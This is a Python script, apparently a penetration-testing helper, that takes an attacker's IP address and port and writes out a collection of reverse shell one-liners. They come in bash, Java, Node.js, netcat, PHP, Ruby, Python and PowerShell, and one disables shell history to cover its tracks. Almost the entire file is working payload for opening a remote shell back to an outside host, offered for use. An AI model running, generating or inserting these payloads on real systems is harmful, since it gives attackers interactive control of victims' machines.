import time
import sys

shellz = '''
       ___   ____
        /' --;^/ ,-_\     \ | /
       / / --o\ o-\ \\   --(_)--
      /-/-/|o|-|\-\\|\\   / | \
       '`  ` |-|   `` '
             |-|
             |-|O
             |-(\,__
          ...|-|\--,\_....
      ,;;;;;;;;;;;;;;;;;;;;;;;;,.
~~,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,  ______   ---------   _____     ------







'''

hacker_found = 0

if len(sys.argv) == 2:
	print('Fastest usage : python _rev_shell_creator.py 192.168.1.10 1337')
	print('Slower usage : python _rev_shell_creator.py - then fillout questions')

if 	len(sys.argv) > 2 :
	LHOST = sys.argv[1]
	LPORT = sys.argv[2]
	hacker_found = 1

else:

	LHOST = input('Please enter your IP address ')
	print("Your IP Address is " + str(LHOST))

	LPORT = input('Please enter the port number you are listerning on ')
	print("Your Port Address is " + str(LPORT)+'\n')

	print("You did read the code first right?")
	time.sleep(2)
	print("I have just PWNED your box :)")
	time.sleep(3)
	print("Just kidding! ")
	time.sleep(1)

with open(str(LHOST)+'_rev_shell.txt','a') as outfile:
	bash1 = 'BASH1 \n '+"bash -i >& /dev/tcp/"+str(LHOST)+'/'+str(LPORT)+" 0>&1"
	bash2 = 'BASH2 \n '+"bash -i >& /dev/tcp/"+str(LHOST)+"/"+str(LPORT)+"0>&1"
	bash3 = 'BASH3 \n '+"0<&196;exec 196<>/dev/tcp/"+LHOST+"/"+LPORT+"; sh <&196 >&196 2>&196"
	java = 'JAVA \n '+'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'+LHOST+'/'+LPORT+';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()'
	javascript = 'JAVASCRIPT \n '+'(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect('+LPORT+', '+LHOST+', function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();'
	nc1 = 'NC 1 \n ' + 'nc -e /bin/sh ' + LHOST +" "+ LPORT
	nc2 = 'NC 2 \n ' + '/bin/sh | nc '+LHOST+" " + LPORT
	nc3 = 'NC 3 \n ' + 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' +LHOST+ " "+LPORT +'>/tmp/f'
	nc4 = 'NC 4 \n ' + 'rm -f backpipe; mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc '+LHOST +" "+LPORT+' 1>/tmp/backpipe'
	nc5 = 'NC 5 \n ' + 'rm -f backpipe; mknod /tmp/backpipe p && nc '+ LHOST +" "+LPORT +'0<backpipe | /bin/bash 1>backpipe'
	php1 = 'PHP 1 \n ' + "php -r '$sock=fsockopen(\""+LHOST+"\","+LPORT+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	php2 = 'PHP 2 \n ' + "php -r '$sock=fsockopen(\""+LHOST+"\","+LPORT+");shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	php3 = 'PHP 3 \n ' + "php -r '$sock=fsockopen(\""+LHOST+"\","+LPORT+");`/bin/sh -i <&3 >&3 2>&3`;'"
	ruby = 'RUBY \n ' + "ruby -rsocket -e'f=TCPSocket.open(\""+LHOST+"\","+LPORT+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" 
	python = 'PYTHON \n ' +"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+LHOST+"\","+LPORT+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	python_udp = 'PYTHON_UDP \n' + "python -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\""+LHOST+ "\","+LPORT+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn([\'/bin/bash\',\'-i\']);s.close();'"
	powershell = 'POWERSHELL \n ' + "$client = New-Object System.Net.Sockets.TCPClient(\'"+LHOST+"\',"+LPORT+"); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();"

	shells = [bash1,bash2,bash3,java,javascript,nc1,nc2,nc3,nc4,nc5,php1,php2,php3,ruby,python,python_udp,powershell]

	for line in shells:
		outfile.write(line+'\n\n')

	print(str(LHOST)+'_rev_shell.txt has now been created.')
	
	if hacker_found == 1:
		print(shellz)
		print('Good luck with your shell collecting ventures!')

